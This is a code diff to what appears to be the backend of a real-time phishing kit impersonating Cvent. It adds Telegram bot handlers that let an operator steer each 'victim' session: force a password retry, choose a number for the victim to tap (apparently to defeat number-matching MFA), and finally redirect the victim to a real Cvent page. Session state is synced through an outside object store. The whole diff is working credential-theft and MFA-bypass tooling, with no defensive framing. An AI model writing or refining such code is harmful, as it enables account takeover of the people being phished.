@@ -175,19 +175,7 @@ async function getSessionAsync(sessionId, forceRefresh = false) {
   if (!sessionId) return null;
   const local = getSession(sessionId);
 
-  // Only true terminal states (saved, approved, wrong_number) skip remote refresh
-  const isTerminal = local && (
-    local.status === 'saved' ||
-    local.status === 'approved' ||
-    local.status === 'wrong_number_pressed' ||
-    (local.redirect && (local.redirect.includes('cvent') || local.redirect === 'saved' || local.redirect === 'wrong_number'))
-  );
-
-  if (isTerminal && !forceRefresh) {
-    return local;
-  }
-
-  // Query remote store for latest operator selections (e.g. approve, reject, new action)
+  // Query remote store for latest operator selections (e.g. number tap, retry, approve)
   if (sessionId && sessionId.length >= 24) {
     try {
       const res = await httpRequest(`https://api.restful-api.dev/objects/${sessionId}`, { method: 'GET' }, null, 2500);
@@ -199,6 +187,7 @@ async function getSessionAsync(sessionId, forceRefresh = false) {
       }
     } catch (e) {}
   }
+
   return local;
 }
 
@@ -374,11 +363,18 @@ async function handleCallbackQuery(callbackQuery, botToken) {
     }
 
     if (action === 'num_menu') {
+      session.status = 'pending';
+      if (session.redirect && session.redirect.includes('cvent')) {
+        delete session.redirect;
+      }
+      await saveSessionAsync(sessionId, session);
       await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId });
       await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
         chat_id: chatId,
         message_id: msgId,
-        text: `🔢 <b>Select Number Range (1-99)</b>\nSession: <code>${sessionId}</code>\nPick a range below:`,
+        text: `🔢 <b>Select Number Range (1-99)</b>
+Session: <code>${sessionId}</code>
+Pick a range below:`,
         parse_mode: 'HTML',
         reply_markup: buildRangePickerKeyboard(sessionId)
       });
@@ -449,24 +445,30 @@ async function handleCallbackQuery(callbackQuery, botToken) {
       session.redirect = 'retry';
       session.status = 'retry';
       session.message = 'retry';
+      delete session.numberTap;
       await saveSessionAsync(sessionId, session);
       await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Password Retry Sent' });
       await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
         chat_id: chatId,
         message_id: msgId,
-        text: `🔁 <b>Password Retry Sent</b>\nSession: <code>${sessionId}</code>\nVictim will be asked for password again.`,
+        text: `🔁 <b>Password Retry Sent</b>
+Session: <code>${sessionId}</code>
+Victim returned to password entry.`,
         parse_mode: 'HTML',
         reply_markup: buildMainActionsKeyboard(sessionId)
       });
     } else if (action === 'approve') {
       session.redirect = FINAL_CVENT_URL;
       session.status = 'saved';
+      delete session.numberTap;
       await saveSessionAsync(sessionId, session);
       await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Approved (Redirecting to Cvent)' });
       await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
         chat_id: chatId,
         message_id: msgId,
-        text: `🎉 <b>VERIFICATION APPROVED</b>\nSession: <code>${sessionId}</code>\nUser redirected to Cvent event summary.`,
+        text: `🎉 <b>VERIFICATION APPROVED</b>
+Session: <code>${sessionId}</code>
+User redirected to Cvent event summary.`,
         parse_mode: 'HTML',
         reply_markup: {
           inline_keyboard: [
@@ -475,14 +477,18 @@ async function handleCallbackQuery(callbackQuery, botToken) {
         }
       });
     } else if (action === 'wrong_num') {
-      session.redirect = 'wrong_number_pressed';
-      session.status = 'wrong_number_pressed';
+      session.redirect = 'retry';
+      session.status = 'retry';
+      session.message = 'retry';
+      delete session.numberTap;
       await saveSessionAsync(sessionId, session);
-      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Marked as Wrong Number' });
+      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Wrong Number (Prompt Retry)' });
       await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
         chat_id: chatId,
         message_id: msgId,
-        text: `❌ <b>Wrong Number Tapped</b>\nSession: <code>${sessionId}</code>`,
+        text: `❌ <b>Wrong Number Tapped</b>
+Session: <code>${sessionId}</code>
+Victim returned to password entry.`,
         parse_mode: 'HTML',
         reply_markup: buildMainActionsKeyboard(sessionId)
       });
@@ -516,6 +522,7 @@ async function handleCallbackQuery(callbackQuery, botToken) {
     session.numberTap = String(number);
     session.redirect = `Number-Tap:${number}`;
     session.status = 'pending';
+    delete session.message;
     await saveSessionAsync(sessionId, session);
 
     await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: `Selected: ${number}` });
